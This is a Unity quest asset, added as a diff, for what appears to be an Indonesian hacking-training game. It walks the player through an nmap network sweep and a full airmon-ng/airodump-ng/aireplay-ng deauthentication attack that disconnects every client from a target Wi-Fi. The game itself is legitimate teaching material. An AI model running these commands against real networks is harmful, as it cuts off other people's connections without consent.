@@ -1,0 +1,76 @@
+%YAML 1.1
+%TAG !u! tag:unity3d.com,2011:
+--- !u!114 &11400000
+MonoBehaviour:
+  m_ObjectHideFlags: 0
+  m_CorrespondingSourceObject: {fileID: 0}
+  m_PrefabInstance: {fileID: 0}
+  m_PrefabAsset: {fileID: 0}
+  m_GameObject: {fileID: 0}
+  m_Enabled: 1
+  m_EditorHideFlags: 0
+  m_Script: {fileID: 11500000, guid: 415f1d7705de97e4d8b4e6d8bf3e136e, type: 3}
+  m_Name: 15_Quest_NetScan
+  m_EditorClassIdentifier: 
+  questID: 15_NetScan
+  questName: Bruno
+  questChat: Hei sepertinya banyak yang berada dalam jaringan yang sama denganmu,
+    lakukanlah scan network menggunakan nmap, lalu lakukan deauth attack kepada semua
+    jaringan yang terhubung.
+  expReward: 60
+  overviewChat: Hei sepertinya banyak yang ...
+  kirimChat: Aku merasakan perbedaanya
+  balasChat: Senang mendengarnya
+  questSteps:
+  - requiredFile: 
+    requiredInput: nmap -sn 192.168.43.0/24
+    userToFind: 
+    requiredButtonTag: 
+    questType: 2
+  - requiredFile: 
+    requiredInput: iwconfig
+    userToFind: 
+    requiredButtonTag: 
+    questType: 2
+  - requiredFile: 
+    requiredInput: airmon-ng start wlan0
+    userToFind: 
+    requiredButtonTag: 
+    questType: 2
+  - requiredFile: 
+    requiredInput: iwconfig
+    userToFind: 
+    requiredButtonTag: 
+    questType: 2
+  - requiredFile: 
+    requiredInput: airodump-ng wlan0mon
+    userToFind: 
+    requiredButtonTag: 
+    questType: 2
+  - requiredFile: 
+    requiredInput: airodump-ng --bssid 16:82:A2:CA:D2:D1 --channel 11 wlan0mon
+    userToFind: 
+    requiredButtonTag: 
+    questType: 2
+  - requiredFile: 
+    requiredInput: aireplay-ng --deauth 0 -a 16:82:A2:CA:D2:D1 wlan0mon
+    userToFind: 
+    requiredButtonTag: 
+    questType: 2
+  - requiredFile: 
+    requiredInput: airmon-ng stop wlan0mon
+    userToFind: 
+    requiredButtonTag: 
+    questType: 2
+  activeQuestText:
+  - Lakukan scan network pada ip network 192.168.43.0/24 lalu lihatlah berapa banyak
+    network yang terhubung
+  - Lakukan pengecekan interface dengan command iwconfig
+  - Aktifkan mode monitor dengan airmon-ng start [interface]
+  - Lakukan pengecekan interface kembali
+  - Tampilkan jaringan wifi disekiar dengan command airodump-ng [interface]
+  - Lakukan monitoring pada Wifi ke satu dengan command airodump-ng --bssid [bssid]
+    --channel [channel] [interface]
+  - Putuskan semua koneksi yang terhubung ke Wifi ke satu dengan command aireplay-ng
+    --deauth 0 -a [bssid] [interface]
+  - Kembalikan ke mode managed dengan command airmon-ng stop [interface]
